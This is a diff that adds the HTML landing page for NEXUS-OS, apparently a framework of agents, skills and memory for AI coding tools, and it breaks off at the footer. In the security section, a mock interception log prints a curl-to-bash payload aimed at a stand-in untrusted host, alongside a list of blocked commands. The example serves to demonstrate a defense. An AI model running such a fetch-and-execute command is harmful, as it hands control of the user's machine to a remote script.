@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="color-scheme" content="dark">
+  <title>NEXUS-OS | The Sovereign Autonomous Agent Operating System</title>
+  <meta name="description" content="NEXUS-OS is the sovereign autonomous agent operating system for software engineering across Claude Code, Cursor, Codex, OpenCode, and Gemini. 72 agents, 350 skills, 106 commands, local SQLite memory.">
+  <meta name="theme-color" content="#07080f">
+  
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  
+  <!-- Open Graph / Social Sharing -->
+  <meta property="og:title" content="NEXUS-OS | The Sovereign Autonomous Agent Operating System">
+  <meta property="og:description" content="72 specialized agents, 350 workflow skills, 106 commands, local SQLite memory vaults via MCP, and deterministic TDD verification across coding agents.">
+  <meta property="og:image" content="/banner.png">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="NEXUS-OS">
+  
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="NEXUS-OS | The Sovereign Autonomous Agent Operating System">
+  <meta name="twitter:description" content="72 agents, 350 skills, 106 commands, and local SQLite memory vaults across Claude Code, Cursor, Codex, and Gemini.">
+  <meta name="twitter:image" content="/banner.png">
+
+  <!-- Schema.org Structured Data -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "SoftwareApplication",
+    "name": "NEXUS-OS",
+    "applicationCategory": "DeveloperApplication",
+    "operatingSystem": "Cross-platform (Linux, macOS, Windows)",
+    "description": "Sovereign Autonomous Agent Operating System for software engineering with 72 specialized agents, 350 workflow skills, 106 commands, and local SQLite memory.",
+    "license": "https://opensource.org/licenses/MIT",
+    "offers": {
+      "@type": "Offer",
+      "price": "0.00",
+      "priceCurrency": "USD"
+    }
+  }
+  </script>
+</head>
+<body>
+
+  <!-- Floating Sticky Navigation Bar -->
+  <header class="navbar" id="navbar">
+    <div class="nav-content">
+      <a href="#" class="brand-logo" id="nav-brand-logo">
+        <div class="brand-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+            <polyline points="2 17 12 22 22 17"></polyline>
+            <polyline points="2 12 12 17 22 12"></polyline>
+          </svg>
+        </div>
+        <span>NEXUS<span class="gradient-text">-OS</span></span>
+        <span class="brand-tag">v2.2.1</span>
+      </a>
+
+      <ul class="nav-links" id="nav-links">
+        <li><a href="#features" id="nav-link-features">Features</a></li>
+        <li><a href="#architecture" id="nav-link-architecture">Architecture</a></li>
+        <li><a href="#catalog" id="nav-link-catalog">Catalog</a></li>
+        <li><a href="#comparison" id="nav-link-comparison">Comparison</a></li>
+        <li><a href="#pricing" id="nav-link-pricing">Pricing</a></li>
+        <li><a href="#faq" id="nav-link-faq">FAQ</a></li>
+      </ul>
+
+      <div class="nav-actions">
+        <a href="https://github.com/nexus-os/nexus-os" target="_blank" rel="noopener" class="btn btn-github" id="nav-btn-github" aria-label="GitHub Repository">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/>
+          </svg>
+          <span>GitHub</span>
+        </a>
+        <a href="#hero-install" class="btn btn-primary" id="nav-btn-install">
+          <span>Get Started</span>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="5" y1="12" x2="19" y2="12"></line>
+            <polyline points="12 5 19 12 12 19"></polyline>
+          </svg>
+        </a>
+        <button class="mobile-toggle" id="mobile-toggle" aria-label="Toggle navigation menu">
+          ☰
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <!-- Hero Section -->
+    <section class="hero" id="hero">
+      <div class="container">
+        <div class="hero-badge">
+          <span class="pulse-dot"></span>
+          <span>Sovereign Autonomous Agent Operating System · v2.2.1</span>
+        </div>
+
+        <h1 class="hero-title">
+          The Operating System for <span class="gradient-text">AI Coding Agents.</span>
+        </h1>
+
+        <p class="hero-subtitle">
+          Orchestrate <strong>72 specialized agents</strong>, <strong>350 production skills</strong>, and <strong>106 slash commands</strong> with embedded SQLite memory, AST security guardrails, and deterministic Red-Green-Refactor TDD verification across Claude Code, Cursor, Codex, OpenCode, and Gemini.
+        </p>
+
+        <div class="hero-cta-group">
+          <a href="#architecture" class="btn btn-primary" id="hero-cta-explore">
+            <span>Explore Architecture</span>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12"></line>
+              <polyline points="12 5 19 12 12 19"></polyline>
+            </svg>
+          </a>
+          <a href="#catalog" class="btn btn-secondary" id="hero-cta-catalog">
+            <span>Browse 350+ Skills &amp; Commands</span>
+          </a>
+        </div>
+
+        <!-- Terminal Install Card -->
+        <div class="terminal-card" id="hero-install">
+          <div class="terminal-header">
+            <div class="terminal-dots">
+              <span class="dot red"></span>
+              <span class="dot yellow"></span>
+              <span class="dot green"></span>
+            </div>
+            <div class="terminal-pm-selector" role="tablist" aria-label="Package Manager Selector">
+              <button class="pm-btn active" data-pm="npx" role="tab" aria-selected="true" id="pm-tab-npx">npx</button>
+              <button class="pm-btn" data-pm="pnpm" role="tab" aria-selected="false" id="pm-tab-pnpm">pnpm</button>
+              <button class="pm-btn" data-pm="bun" role="tab" aria-selected="false" id="pm-tab-bun">bun</button>
+              <button class="pm-btn" data-pm="yarn" role="tab" aria-selected="false" id="pm-tab-yarn">yarn</button>
+            </div>
+          </div>
+          <div class="terminal-body">
+            <div class="command-line">
+              <span class="prompt-symbol">$</span>
+              <code id="install-cmd-text">npx nexus-os setup</code>
+            </div>
+            <button class="copy-btn" id="copy-cmd-btn" aria-label="Copy installation command">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+              </svg>
+              <span>Copy</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- Platform Compatibility Pills -->
+        <div class="platforms-row">
+          <span class="platform-pill">⚡ Claude Code Native</span>
+          <span class="platform-pill">🎯 Cursor IDE</span>
+          <span class="platform-pill">🤖 OpenAI Codex</span>
+          <span class="platform-pill">🌐 OpenCode</span>
+          <span class="platform-pill">💎 Google Gemini</span>
+          <span class="platform-pill">🌙 Kimi Code</span>
+          <span class="platform-pill">🛡️ Local Ollama &amp; vLLM</span>
+        </div>
+
+        <!-- Key Metrics Strip -->
+        <div class="metrics-strip">
+          <div class="metric-item">
+            <div class="metric-val gradient-text">72</div>
+            <div class="metric-label">Autonomous Subagents</div>
+          </div>
+          <div class="metric-item">
+            <div class="metric-val">350</div>
+            <div class="metric-label">Production Skills</div>
+          </div>
+          <div class="metric-item">
+            <div class="metric-val">106</div>
+            <div class="metric-label">Slash Commands</div>
+          </div>
+          <div class="metric-item">
+            <div class="metric-val" style="color: var(--accent-emerald);">100%</div>
+            <div class="metric-label">Sovereign · 0 Telemetry</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Architecture & Core Innovations -->
+    <section class="section" id="architecture">
+      <div class="container">
+        <div class="section-header">
+          <span class="section-tag">Core Innovations</span>
+          <h2 class="section-title">Engineered for Deterministic Autonomous Execution</h2>
+          <p class="section-desc">
+            Unlike simple prompting wrappers or chat extensions, NEXUS-OS provides a full runtime kernel with verification loops, persistent memory, and security containment.
+          </p>
+        </div>
+
+        <div class="showcase-tabs" role="tablist">
+          <button class="tab-btn active" data-tab="tdd" role="tab" id="tab-btn-tdd">TDD Verification Kernel</button>
+          <button class="tab-btn" data-tab="canvas" role="tab" id="tab-btn-canvas">Plan Canvas &amp; Operator</button>
+          <button class="tab-btn" data-tab="memory" role="tab" id="tab-btn-memory">SQLite Memory Vault (MCP)</button>
+          <button class="tab-btn" data-tab="security" role="tab" id="tab-btn-security">AgentShield AST Guardrails</button>
+        </div>
+
+        <!-- Tab 1: TDD -->
+        <div class="tab-content active" id="tab-tdd">
+          <div class="tab-info">
+            <h3>Deterministic Red-Green-Refactor Engine</h3>
+            <p>
+              AI models left unconstrained hallucinate passing tests or write code without verification. NEXUS-OS strictly enforces the Test-Driven Development kernel:
+            </p>
+            <ul class="feature-checklist">
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Step 1 (Red):</strong> Agent must author an isolated failing unit test first and execute the test runner to prove failure.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Step 2 (Green):</strong> Implement the minimal code necessary to make the failing assertion pass cleanly.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Step 3 (Refactor):</strong> Clean architecture optimization without breaking the test suite boundary.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>80%+ Coverage Gate:</strong> Automated coverage verification blocks PR creation until coverage thresholds are satisfied.</span>
+              </li>
+            </ul>
+            <a href="#catalog" class="btn btn-secondary">Explore /tdd Command</a>
+          </div>
+          <div class="code-preview">
+            <pre><code><span class="comment"># Autonomous TDD Kernel Execution</span>
+$ nexus /tdd "Implement sliding-window token bucket rate limiter"
+
+<span class="kw">[RED PHASE]</span>
+Writing test: tests/rate-limiter.test.ts
+Running: node --test tests/rate-limiter.test.ts
+<span class="fn">Result:</span> ✗ Expected status 429 after 10 requests, received undefined.
+Assertion verified: Test fails deterministically.
+
+<span class="kw">[GREEN PHASE]</span>
+Implementing: src/rate-limiter.ts (minimal implementation)
+Running: node --test tests/rate-limiter.test.ts
+<span class="str">Result:</span> ✓ 4 passed, 0 failed.
+
+<span class="kw">[REFACTOR & COVERAGE]</span>
+Code health score: 98/100
+Branch coverage: 94.2% (Threshold: 80%)
+<span class="fn">Status:</span> Gate cleared. Mergeable.</code></pre>
+          </div>
+        </div>
+
+        <!-- Tab 2: Canvas -->
+        <div class="tab-content" id="tab-canvas">
+          <div class="tab-info">
+            <h3>Plan Canvas &amp; Multi-Session Control Pane</h3>
+            <p>
+              Visual steering for long-running autonomous workflows. Coordinate parallel subagents across git worktrees and inspect agent reasoning before executing destructive tasks.
+            </p>
+            <ul class="feature-checklist">
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Browser Plan Canvas:</strong> Annotate and review architectural plans in your browser; send targeted feedback directly to subagents.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Worktree Orchestration:</strong> Spawn multiple agent workers in parallel git worktrees with zero collision.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Human-in-the-Loop Gating:</strong> Non-negotiable confirmation steps before pushing commits or running remote migrations.</span>
+              </li>
+            </ul>
+            <a href="#catalog" class="btn btn-secondary">View /plan-canvas</a>
+          </div>
+          <div class="code-preview">
+            <pre><code><span class="comment"># Launching Operator Control Pane</span>
+$ nexus control:pane --port 3100
+
+<span class="kw">[SESSION MONITOR]</span>
+Active Sessions: 3 | Worktrees: 3 | Memory Vault: Connected
+• Session #104: tdd-driver → (auth-service) [RUNNING]
+• Session #105: database-reviewer → (/db-profile) [PROFILING]
+• Session #106: security-reviewer → (/sbom-scan) [COMPLETE]
+
+<span class="fn">Plan Canvas:</span> http://localhost:3100/canvas
+Annotation received on Line 42: "Split index by tenant_id"
+Handoff dispatched to session #105.</code></pre>
+          </div>
+        </div>
+
+        <!-- Tab 3: Memory -->
+        <div class="tab-content" id="tab-memory">
+          <div class="tab-info">
+            <h3>SQLite Memory Vault via Model Context Protocol (MCP)</h3>
+            <p>
+              Say goodbye to context amnesia between sessions and tools. NEXUS-OS includes an embedded local SQLite vector &amp; relational memory vault exposed directly through MCP.
+            </p>
+            <ul class="feature-checklist">
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>100% Local &amp; Private:</strong> All notes, decisions, and architectural ADRs live in your repository SQLite database.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Cross-Harness Handoffs:</strong> Save a session context in Claude Code, resume it in Cursor IDE or OpenAI Codex seamlessly.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>MCP Protocol Native:</strong> Automatically exposes `memory_search`, `memory_save`, and `memory_doctor` to any MCP client.</span>
+              </li>
+            </ul>
+            <a href="#catalog" class="btn btn-secondary">Explore Unified Memory</a>
+          </div>
+          <div class="code-preview">
+            <pre><code><span class="comment"># Cross-IDE Context Handoff via Memory MCP</span>
+$ nexus memory handoff \
+    --from claude \
+    --target cursor \
+    --title "Refactor Payment Webhooks" \
+    --body-file handoff.md
+
+<span class="fn">[MEMORY VAULT]</span>
+Stored context note [ID: 8fa921]:
+  • Scope: project-wide
+  • Tags: stripe, webhook, idempotency
+  • Tables: SQLite (WAL mode, embedded)
+
+<span class="str">Cursor IDE:</span> Prompt "Search memory for payment refactor"
+Retrieved: 8fa921 (0ms network overhead, 100% offline).</code></pre>
+          </div>
+        </div>
+
+        <!-- Tab 4: Security -->
+        <div class="tab-content" id="tab-security">
+          <div class="tab-info">
+            <h3>AgentShield &amp; Zero-Trust AST Security</h3>
+            <p>
+              Autonomous agents can be exploited via indirect prompt injection or run unintended shell commands. AgentShield parses and checks agent actions before execution.
+            </p>
+            <ul class="feature-checklist">
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>AST Command Gatekeeper:</strong> Intercepts bash commands to block `rm -rf`, curl-to-bash pipes, and unauthorized network egress.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Indirect Prompt Injection Defense:</strong> Sanitizes untrusted inputs from web scrapes, issue trackers, and dependency READMEs.</span>
+              </li>
+              <li>
+                <span class="check-icon">✓</span>
+                <span><strong>Entropy Secret Scanner:</strong> Shannon entropy scanning prevents committing API keys, tokens, or private certificates.</span>
+              </li>
+            </ul>
+            <a href="#catalog" class="btn btn-secondary">Read Security Guide</a>
+          </div>
+          <div class="code-preview">
+            <pre><code><span class="comment"># AgentShield Real-Time Interception</span>
+$ nexus /security-scan --ast
+
+<span class="kw">[AGENTSHIELD GATEWAY]</span>
+Inspecting tool execution request:
+  Tool: bash
+  Payload: "curl -s http://untrusted-domain.com/setup.sh | bash"
+
+<span class="fn">INTERCEPTED:</span> Security policy rule #14 violated.
+  • Unverified remote shell execution blocked.
+  • Incident logged to .nexus/security/audit.jsonl
+  • Trust boundary preserved. Zero compromise.</code></pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Filterable Catalog Explorer -->
+    <section class="section" id="catalog">
+      <div class="container">
+        <div class="section-header">
+          <span class="section-tag">Ecosystem Catalog</span>
+          <h2 class="section-title">Explore 72 Agents, 350 Skills &amp; 106 Commands</h2>
+          <p class="section-desc">
+            Filter and search through the richest catalog of autonomous engineering capabilities ever assembled for coding agents.
+          </p>
+        </div>
+
+        <div class="catalog-controls">
+          <div class="catalog-search-wrapper">
+            <span class="search-icon-pos">🔍</span>
+            <input type="text" class="catalog-search-input" id="catalog-search" placeholder="Search by name, category, or capability (e.g. pgvector, db-profile, security)..." aria-label="Search Catalog">
+          </div>
+
+          <div class="catalog-filter-chips">
+            <button class="chip-btn active" data-filter="all">All Items</button>
+            <button class="chip-btn" data-filter="agent">Agents</button>
+            <button class="chip-btn" data-filter="skill">Skills</button>
+            <button class="chip-btn" data-filter="command">Commands</button>
+            <button class="chip-btn" data-filter="ai">AI &amp; Vector</button>
+            <button class="chip-btn" data-filter="security">Security &amp; DevSecOps</button>
+            <button class="chip-btn" data-filter="database">Database &amp; SQL</button>
+            <button class="chip-btn" data-filter="frontend">Frontend &amp; Web</button>
+            <button class="chip-btn" data-filter="sre">SRE &amp; Chaos</button>
+          </div>
+        </div>
+
+        <div class="catalog-grid" id="catalog-grid">
+          <!-- Dynamically populated by main.js -->
+        </div>
+      </div>
+    </section>
+
+    <!-- Side-by-Side Comparison Matrix -->
+    <section class="section" id="comparison">
+      <div class="container">
+        <div class="section-header">
+          <span class="section-tag">Benchmark &amp; Parity</span>
+          <h2 class="section-title">Architectural Comparison Matrix</h2>
+          <p class="section-desc">
+            See how NEXUS-OS compares to existing agent frameworks, code extensions, and traditional toolkits.
+          </p>
+        </div>
+
+        <div class="matrix-wrapper">
+          <table class="matrix-table">
+            <thead>
+              <tr>
+                <th style="width: 28%;">Capability / Feature</th>
+                <th class="featured-col" style="width: 24%;">NEXUS-OS (v2.2)</th>
+                <th style="width: 16%;">Legacy Toolkits</th>
+                <th style="width: 16%;">LangGraph / CrewAI</th>
+                <th style="width: 16%;">OpenHands</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>
+                  <span class="feature-name">Architecture &amp; Layer</span>
+                  <span class="feature-sub">Operating layer across multi-harness IDEs</span>
+                </td>
+                <td class="featured-col">Turnkey Native OS</td>
+                <td>Plugin Toolkit</td>
+                <td>Python Framework</td>
+                <td>Docker Container</td>
+              </tr>
+              <tr>
+                <td>
+                  <span class="feature-name">Catalog Scale</span>
+                  <span class="feature-sub">Autonomous agents, skills, and commands</span>
+                </td>
+                <td class="featured-col">72 Agents · 350 Skills · 106 Commands</td>
+                <td>Fixed subagent set</td>
+                <td>Custom code required</td>
+                <td>Fixed developer prompt</td>
+              </tr>
+              <tr>
+                <td>
+                  <span class="feature-name">TDD Verification Kernel</span>
+                  <span class="feature-sub">Enforced Red-Green-Refactor with coverage gates</span>
+                </td>
+                <td class="featured-col">✓ Native Kernel Gate</td>
+                <td>Manual workflow</td>
+                <td>User-scripted</td>
+                <td>Eval benchmark only</td>
+              </tr>
+              <tr>
+                <td>
+                  <span class="feature-name">Local Persistent Memory</span>
+                  <span class="feature-sub">SQLite vector/relational vault via MCP</span>
+                </td>
+                <td class="featured-col">✓ Embedded SQLite (MCP)</td>
+                <td>Basic file notes</td>
+                <td>Requires cloud DB</td>
+                <td>Session-bound</td>
+              </tr>
+              <tr>
+                <td>
+                  <span class="feature-name">Supported Harnesses</span>
+                  <span class="feature-sub">Native IDE and CLI developer targets</span>
+                </td>
+                <td class="featured-col">Claude, Cursor, Codex, OpenCode, Gemini</td>
+                <td>Claude Code first</td>
+                <td>Python runtime</td>
+                <td>Web UI / Docker</td>
+              </tr>
+              <tr>
+                <td>
+                  <span class="feature-name">AST Security Guardrails</span>
+                  <span class="feature-sub">Real-time command interception &amp; injection defense</span>
+                </td>
+                <td class="featured-col">✓ AgentShield AST Gate</td>
+                <td>Basic scanner</td>
+                <td>None (raw tools)</td>
+                <td>Container isolation</td>
+              </tr>
+              <tr>
+                <td>
+                  <span class="feature-name">Telemetry &amp; Sovereignty</span>
+                  <span class="feature-sub">Data privacy and air-gapped capability</span>
+                </td>
+                <td class="featured-col">100% Sovereign (0 Telemetry)</td>
+                <td>Public telemetry</td>
+                <td>SaaS analytics</td>
+                <td>Cloud logging</td>
+              </tr>
+              <tr>
+                <td>
+                  <span class="feature-name">Licensing</span>
+                  <span class="feature-sub">Commercial and open-source usage rights</span>
+                </td>
+                <td class="featured-col">MIT (100% Free OSS)</td>
+                <td>MIT</td>
+                <td>MIT / Business</td>
+                <td>MIT</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <!-- Sponsors & Backers Shelf -->
+    <section class="container">
+      <div class="sponsors-shelf">
+        <div style="text-align: center; width: 100%; margin-bottom: 8px;">
+          <span style="font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted); font-weight: 700;">Supported by industry leaders</span>
+        </div>
+        <div class="sponsor-logo-box">CodeRabbit</div>
+        <div class="sponsor-logo-box">Greptile</div>
+        <div class="sponsor-logo-box">Atlas Cloud</div>
+        <div class="sponsor-logo-box">Moonshot AI (Kimi)</div>
+        <div class="sponsor-logo-box">Itô Markets</div>
+      </div>
+    </section>
+
+    <!-- Pricing & Plans -->
+    <section class="section" id="pricing">
+      <div class="container">
+        <div class="section-header">
+          <span class="section-tag">Flexible Deployment</span>
+          <h2 class="section-title">Start Free with Open Source. Scale Seamlessly.</h2>
+          <p class="section-desc">
+            NEXUS-OS is 100% free and open source. For engineering organizations requiring centralized security policies and team memory vaults, enterprise options are available.
+          </p>
+        </div>
+
+        <div class="pricing-grid">
+          <!-- Community Tier -->
+          <article class="pricing-card">
+            <h3 class="tier-name">Community OSS</h3>
+            <p class="tier-desc">Complete open-source operating system for individual software engineers.</p>
+            <div class="tier-price">$0 <span>/ forever</span></div>
+            <ul class="tier-features">
+              <li><span class="check-icon">✓</span> 72 Autonomous Subagents</li>
+              <li><span class="check-icon">✓</span> 350 Workflow Skills</li>
+              <li><span class="check-icon">✓</span> 106 Slash Commands</li>
+              <li><span class="check-icon">✓</span> Embedded SQLite Memory Vault (MCP)</li>
+              <li><span class="check-icon">✓</span> Red-Green-Refactor TDD Driver</li>
+              <li><span class="check-icon">✓</span> 100% Local · Zero Telemetry</li>
+            </ul>
+            <a href="#hero-install" class="btn btn-secondary">Install Locally</a>
+          </article>
+
+          <!-- Pro Team Tier -->
+          <article class="pricing-card popular">
+            <span class="popular-badge">Most Popular</span>
+            <h3 class="tier-name">Developer Pro</h3>
+            <p class="tier-desc">Enhanced repository intelligence, shared memory, and automated review bot.</p>
+            <div class="tier-price">$19 <span>/ seat / mo</span></div>
+            <ul class="tier-features">
+              <li><span class="check-icon">✓</span> Everything in Community OSS</li>
+              <li><span class="check-icon">✓</span> Shared Team Memory Vaults</li>
+              <li><span class="check-icon">✓</span> GitHub App PR Reviewer Bot</li>
+              <li><span class="check-icon">✓</span> Automated Dependency CVE Audits</li>
+              <li><span class="check-icon">✓</span> Priority Issue Resolution</li>
+              <li><span class="check-icon">✓</span> Discord Private Developer Lounge</li>
+            </ul>
+            <a href="https://github.com/sponsors/nexus-os-team" target="_blank" rel="noopener" class="btn btn-primary">Upgrade to Pro</a>
+          </article>
+
+          <!-- Enterprise Tier -->
+          <article class="pricing-card">
+            <h3 class="tier-name">Enterprise Sovereign</h3>
+            <p class="tier-desc">Air-gapped on-premise governance, custom fine-tuned SLMs, and compliance.</p>
+            <div class="tier-price" style="font-size: 2.2rem;">Custom <span>/ team</span></div>
+            <ul class="tier-features">
+              <li><span class="check-icon">✓</span> Everything in Developer Pro</li>
+              <li><span class="check-icon">✓</span> Air-gapped / Isolated VPC Deployment</li>
+              <li><span class="check-icon">✓</span> Custom Fine-Tuned Model Adapters</li>
+              <li><span class="check-icon">✓</span> SOC2 &amp; GDPR Audit Logging</li>
+              <li><span class="check-icon">✓</span> Dedicated Implementation Architect</li>
+              <li><span class="check-icon">✓</span> Enterprise SLA &amp; 24/7 Security Hotline</li>
+            </ul>
+            <a href="mailto:doodleino@gmail.com" class="btn btn-secondary">Contact via Email</a>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ Accordion -->
+    <section class="section" id="faq">
+      <div class="container">
+        <div class="section-header">
+          <span class="section-tag">Got Questions?</span>
+          <h2 class="section-title">Frequently Asked Questions</h2>
+          <p class="section-desc">
+            Everything you need to know about adopting NEXUS-OS in your development workflow.
+          </p>
+        </div>
+
+        <div class="faq-list">
+          <div class="faq-item open">
+            <button class="faq-trigger">
+              <span>What is NEXUS-OS and how is it different from prompting?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-body">
+              <p>
+                Prompts alone do not enforce software engineering discipline. NEXUS-OS is a complete operating system layer that bridges model capabilities with deterministic development invariants. It gives agents structured roles (72 subagents), executable workflows (350 skills), ergonomic shortcuts (106 commands), persistent local memory (SQLite MCP), and a non-negotiable Red-Green-Refactor test driver.
+              </p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-trigger">
+              <span>How does NEXUS-OS integrate with Claude Code and Cursor?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-body">
+              <p>
+                NEXUS-OS works directly in your environment through native configuration surfaces. For Claude Code, it configures `.claude/` plugins and commands. For Cursor, it maps agents into `.cursorrules` and sets up the SQLite Memory Vault via `.mcp.json`. Installing via `npx nexus-os setup` automatically detects your active IDEs and configures them in seconds.
+              </p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-trigger">
+              <span>Is my code or data sent to any third-party servers?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-body">
+              <p>
+                No. NEXUS-OS is 100% sovereign and has zero telemetry or phone-home tracking. All memory vaults, session notes, and AST security logs remain strictly on your local filesystem in SQLite. You communicate directly with your chosen LLM provider API (Anthropic, OpenAI, Google) or run 100% air-gapped via local Ollama and vLLM models.
+              </p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-trigger">
+              <span>How does the TDD verification kernel prevent bugs?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-body">
+              <p>
+                When you invoke `/tdd`, the agent cannot author implementation code until it has written a unit test and executed the test runner to prove that the test fails (Red phase). Only after capturing the verified failure does the agent write minimal code to pass (Green phase). Finally, it verifies that project test suites remain passing and coverage satisfies your minimum threshold (80%+).
+              </p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-trigger">
+              <span>Can I add custom skills or subagents for my company?</span>
+              <span class="faq-icon">+</span>
+            </button>
+            <div class="faq-body">
+              <p>
+                Yes! NEXUS-OS is designed for seamless extensibility. You can run `/skill-create [skill-name]` to scaffold a canonical skill with YAML frontmatter, execution checklists, and output contracts. Custom agents can be dropped directly into `agents/` and immediately become available to your autonomous loops.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Closing CTA Banner -->
+    <section class="container">
+      <div class="cta-banner">
+        <h2>Ready to Upgrade to Autonomous Engineering?</h2>
+        <p>
+          Transform your AI coding harness with 72 specialized agents, 350 skills, local SQLite memory, and deterministic verification.
+        </p>
+        <div class="hero-cta-group" style="margin-bottom: 0;">
+          <a href="#hero-install" class="btn btn-primary">
+            <span>Install NEXUS-OS (Free)</span>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12"></line>
+              <polyline points="12 5 19 12 12 19"></polyline>
+            </svg>
+          </a>
+          <a href="https://github.com/nexus-os/nexus-os" target="_blank" rel="noopener" class="btn btn-secondary">
+            <span>View GitHub Repository</span>
+          </a>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Rich Footer -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-grid">
+        <div class="footer-brand-block">
+          <h4>NEXUS-OS</h4>
+          <p>
+            The sovereign autonomous agent operating system for software engineering across Claude Code, Cursor, Codex, OpenCode, and Gemini.
+          </p>
+          <div style="display: flex; gap: 10px;">
+            <a href="https://github.com/nexus-os/nexus-os" target="_blank" rel="noopener" class="btn btn-github">GitHub</a>
+            <a href="mailto:doodleino@gmail.com" class="btn btn-github">Email</a>
+          </div>
+        </div>
+
+        <div class="footer-col">
+          <h5>Core Guides</h5>
+          <ul>
+            <li><a href="https://github.com/nexus-os/nexus-os/blob/main/the-shortform-guide.md">Shorthand Guide</a></li>
+            <li><a href="https://github.com/nexus-os/nexus-os/blob/main/the-longform-guide.md">Longform Guide</a></li>
+            <li><a href="https://github.com/nexus-os/nexus-os/blob/main/the-security-guide.md">Security Guide</a></li>
+            <li><a href="https://github.com/nexus-os/nexus-os/blob/main/COMMANDS-QUICK-REF.md">Commands Quick Ref</a></li>
+          </ul>
+        </div>
+
+        <div class="footer-col">
+          <h5>Platform</h5>
+          <ul>
+            <li><a href="#architecture">TDD Driver Kernel</a></li>
+            <li><a href="#architecture">Plan Canvas</a></li>
+            <li><a href="#architecture">SQLite Memory Vault</a></li>
+            <li><a href="#architecture">AgentShield Security</a></li>
+            <li><a href="#catalog">350+ Skills Library</a></li>
+          </ul>
+        </div>
+
+        <div class="footer-col">
+          <h5>Legal &amp; Policy</h5>
+          <ul>
+            <li><a href="https://github.com/nexus-os/nexus-os/blob/main/LICENSE">MIT License</a></li>
+            <li><a href="https://github.com/nexus-os/nexus-os/blob/main/SECURITY.md">Security Policy</a></li>
+            <li><a href="https://github.com/nexus-os/nexus-os/blob/main/CONTRIBUTING.md">Contributing &amp; DCO</a></li>
+            <li><a href="https://github.com/nexus-os/nexus-os/blob/main/SPONSORS.md">Sponsors &amp; Partners</a></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <div>
+          &copy; 2026 NEXUS-OS Core Team. Released under the MIT License.
+        </div>
+        <div>
